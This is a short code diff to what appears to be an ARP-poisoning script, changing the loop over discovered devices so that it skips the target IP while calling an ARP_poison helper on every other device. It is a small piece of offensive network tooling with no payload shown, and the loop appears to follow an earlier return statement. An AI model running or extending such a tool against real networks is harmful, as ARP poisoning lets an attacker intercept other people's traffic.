@@ -32,8 +32,9 @@ def main():
     return 1
 
     for device in deviceList:
-        logger.say(f'poisoning {device}')
-        arp.ARP_poison(device, IP, True)
+        if device != IP:
+            logger.say(f'poisoning {device}')
+            arp.ARP_poison(device, IP, True)
 
     return 1
 
